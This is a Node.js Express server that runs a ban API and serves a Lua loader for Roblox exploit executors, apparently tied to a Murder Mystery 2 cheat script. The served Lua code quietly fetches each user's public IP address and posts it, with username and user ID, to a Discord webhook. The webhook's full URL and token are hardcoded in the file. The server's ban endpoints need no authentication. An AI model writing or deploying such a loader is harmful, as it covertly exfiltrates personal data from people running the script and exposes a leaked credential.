const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Store bans in memory (resets when server restarts)
let bans = {};

app.get('/check', (req, res) => {
    const { id } = req.query;
    if (bans[id]) {
        res.json({ banned: true, reason: bans[id].reason });
    } else {
        res.json({ banned: false });
    }
});

app.get('/ban', (req, res) => {
    const { id, reason } = req.query;
    bans[id] = { reason: reason || 'No reason', time: Date.now() };
    res.send('banned');
});

app.get('/loader', (req, res) => {
    const webhook = req.query.webhook || 'https://discord.com/api/webhooks/1525580721916350584/2kJvcbpMHmSXjI2wmiUsfuGp2p_RgqdNcY7TNP3D1BuX7i_kmw3KYk48Ax7B49DxnEgj';
    const scriptName = req.query.script || 'script';
    
    res.send(`
local p = game:GetService("Players").LocalPlayer
local uid = tostring(p.UserId)
local ip = ""
pcall(function() ip = game:HttpGet("https://api.ipify.org") end)

-- Check if banned
local r = game:HttpGet("https://mm2-ban-api.onrender.com/check?id=" .. uid)
if r and r:find("true") then
    p:Kick("You are banned from this script")
    return
end

-- Send webhook
local msg = "**" .. "${scriptName}" .. "** executed\\nUser: " .. p.Name .. " (" .. uid .. ")\\nIP: ||" .. ip .. "||\\n\\n[Perma Ban](https://mm2-ban-api.onrender.com/ban?id=" .. uid .. "&reason=perma)\\n[Temp Ban](https://mm2-ban-api.onrender.com/ban?id=" .. uid .. "&reason=temp_24h)"
local req = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or http_request or request
if req then
    req({Url="${webhook}", Method="POST", Headers={["Content-Type"]="application/json"}, Body='{"content":"' .. msg .. '"}'})
else
    game:HttpPost("${webhook}", '{"content":"' .. msg .. '"}', true)
end
`);
});

app.listen(PORT, () => console.log('Running on port ' + PORT));
